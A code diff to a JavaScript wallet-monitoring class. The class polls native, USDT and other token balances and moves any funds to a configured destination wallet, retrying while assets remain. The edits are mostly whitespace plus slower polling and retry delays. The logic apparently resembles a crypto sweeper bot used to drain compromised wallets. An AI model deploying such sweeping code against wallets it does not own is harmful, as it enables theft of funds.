@@ -3,19 +3,20 @@ class AbstractChainMonitor {
     this.chainName = chainName;
     this.config = config;
     this.destinationWallet = config.destinationWallet;
-    this.monitoringInterval = config.monitoringInterval || 3000;
-    
+    this.monitoringInterval = config.monitoringInterval || 3000; // Increased from 1s to 3s
+    this.retryDelays = [5000, 10000, 20000, 40000, 60000];
+
     this.lastNativeBalance = null;
     this.lastUSDTBalance = null;
     this.lastExtraTokenBalances = {};
     this.transferInProgress = false;
-    
+
     this.consecutiveFailures = 0;
     this.maxConsecutiveFailures = 3;
     this.lastTransferAttemptTime = null;
     this.broadcastedTxHashes = new Set();
     this.multisigDetected = false;
-    
+
     this.monitoringIntervalHandle = null;
     this.lastLogTime = 0;
     this.logIntervalMs = 30000;
@@ -31,7 +32,7 @@ class AbstractChainMonitor {
 
   getBackoffDelay() {
     if (this.consecutiveFailures === 0) return 0;
-    
+
     const delays = [2000, 5000, 10000, 15000, 30000];
     const index = Math.min(this.consecutiveFailures - 1, delays.length - 1);
     return delays[index];
@@ -60,10 +61,10 @@ class AbstractChainMonitor {
       }
 
       const balances = await this.getBalances();
-      
+
       const now = Date.now();
       const shouldLogBalance = (now - this.lastLogTime) >= this.logIntervalMs;
-      
+
       if (shouldLogBalance) {
         let balanceLog = `💰 Native: ${this.formatNativeBalance(balances.native)} | USDT: ${this.formatUSDTBalance(balances.usdt)}`;
         if (balances.extraTokens) {
@@ -79,7 +80,7 @@ class AbstractChainMonitor {
 
       let shouldTransfer = false;
       let reason = '';
-      
+
       const hasExtraTokens = balances.extraTokens && Object.values(balances.extraTokens).some(b => b > 0n);
 
       if (this.lastNativeBalance === null) {
@@ -107,7 +108,7 @@ class AbstractChainMonitor {
             }
           }
         }
-        
+
         if (!shouldTransfer && (balances.usdt > 0n || this.shouldTransferNativeBalance(balances.native) || hasExtraTokens)) {
           shouldTransfer = true;
           reason = 'Assets still present - retrying transfer';
@@ -168,7 +169,7 @@ class AbstractChainMonitor {
           await new Promise(resolve => setTimeout(resolve, 5000));
 
           const newBalances = await this.getBalances();
-          
+
           const hasNewExtraTokens = newBalances.extraTokens && Object.values(newBalances.extraTokens).some(b => b > 0n);
 
           if (newBalances.usdt === 0n && !this.shouldTransferNativeBalance(newBalances.native) && !hasNewExtraTokens) {
